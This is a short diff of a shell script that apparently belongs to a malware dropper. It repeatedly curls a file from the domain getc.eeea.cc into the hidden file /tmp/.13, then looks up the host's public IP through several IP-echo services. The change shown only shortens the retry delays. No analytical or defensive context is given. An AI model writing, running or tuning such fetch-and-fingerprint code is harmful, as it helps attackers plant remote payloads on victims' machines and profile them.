@@ -4,17 +4,19 @@ c=' -4fsL --connect-timeout 3 -m 15 --retry 0 '
 while :; do
     curl $c -o /tmp/.13 "https://getc.eeea.cc/c"
     [ $? -eq 0 ] && break
-    sleep 5
+    sleep 2
 done
 
 while :; do
     b_ip=$(curl $c https://ipecho.net/plain)
     [ $? -eq 0 ] && break
+    sleep 1
     b_ip=$(curl $c https://ipinfo.io/ip)
     [ $? -eq 0 ] && break
+    sleep 1
     b_ip=$(curl $c https://v4.ident.me/)
     [ $? -eq 0 ] && break
-    sleep 5
+    sleep 1
 done
 
 b_ip=$(echo -n "$b_ip")
